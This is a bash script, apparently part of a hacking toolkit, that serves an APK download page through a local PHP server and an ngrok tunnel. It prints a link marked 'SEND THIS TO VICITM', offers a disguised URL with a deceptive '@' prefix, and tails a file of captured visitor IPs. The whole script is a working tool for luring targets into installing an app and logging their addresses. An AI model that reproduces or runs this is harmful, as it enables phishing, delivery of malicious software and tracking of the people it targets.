#!/bin/bash
#Youtube channel : https://www.youtube.com/channel/UCDWhaLh7OIKzH4Bk952l7Iw
#Github (coded by vaimpier ritik ) >>> : https://github.com/VaimpierOfficial
#For business : sonuv0085@gmail.com
#vaimpier
#==========================================================================================================================
#----


clear
echo ""
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   SERVER   NOW  STARTING   !      \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
echo ""

echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
read -p $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m[!] Confirm app name [ Ex:- application_name ] :  \e[0m' app_name
cd js
if [[ -f _app.js ]]; then
	rm _app.js _apk.js
	echo '
      
var redButton = document.getElementById("redButton");

redButton.addEventListener("click", Redirect);


function Redirect() {

//replace



}
   ' > _apk.js



fi

#sed "/replace/a window.open('APKS/${app_name}.apk');" _apk.js > _app.js
sed "/replace/a window.location.href = 'APKS/${app_name}.apk';" _apk.js > _app.js
cd ..



echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
cd APKS

if [[ -f "$app_name.apk" ]]; then
	echo -e $"\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m Confirmed : $app_name.apk \e[0m"
	echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
else
	exit
fi

cd ..
sleep 4
clear
echo ""
php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok



echo ""
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
php -S 127.0.0.1:4444 > /dev/null 2>&1 &
sleep 3
echo ""
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
./ngrok http 4444 > /dev/null 2>&1 &
sleep 25
clear
echo ""
url=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
echo ""
echo ""
echo -e "\e[96m======================\e[91m SEND THIS TO VICITM \e[96m========================= \e[93m"
echo ""
echo "" 
read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m [ Y/N ] : \e[0m' option
echo ""
if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]];
then
  echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
  printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.vaimpierritik.com-@${url}/APKS/${app_name}.apk                                    
  echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'

else
  echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
  printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://${url}
  echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
fi
                           
echo "" > ip.txt
echo ""
echo ""
tail -f ip.txt
